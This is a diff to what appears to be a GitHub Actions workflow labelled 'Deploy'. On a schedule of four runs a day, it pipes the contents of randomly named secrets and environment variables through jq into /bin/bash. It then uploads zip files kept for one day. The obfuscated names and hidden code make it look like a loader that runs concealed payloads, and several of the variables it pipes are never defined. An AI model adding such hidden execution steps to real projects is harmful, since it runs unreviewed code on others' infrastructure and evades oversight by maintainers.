@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '12 1,7,13,19 * * *'
+    - cron: '15 3,9,15,21 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,14 +16,19 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          okk72528: ${{ secrets.okk72528 }}
+          hc62: ${{ secrets.hc62 }}
         run: |
-          printf '%s' "$okk72528" | jq -r .cy7432 | /bin/bash
-          printf '%s' "$ofze4325" | jq -r .daj5794 | /bin/bash
+          printf '%s' "$hc62" | jq -r .kkb07080 | /bin/bash
+          echo $bgpy39 | jq -r .ok065 | /bin/bash
+          printf '%s' "$ys8" | jq -r .ngy48 | /bin/bash
+          printf '%s' "$qkqz4" | jq -r .j6188 | /bin/bash
+          printf '%s' "$tc47569" | jq -r .tlxk602 | /bin/bash
+          printf '%s' "$mg52395" | jq -r .czjwy2683 | /bin/bash
+          echo $dri654 | jq -r .h8 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: T1fUDc8C
+          name: 6LSdaErv
           path: "*.zip"
           retention-days: 1
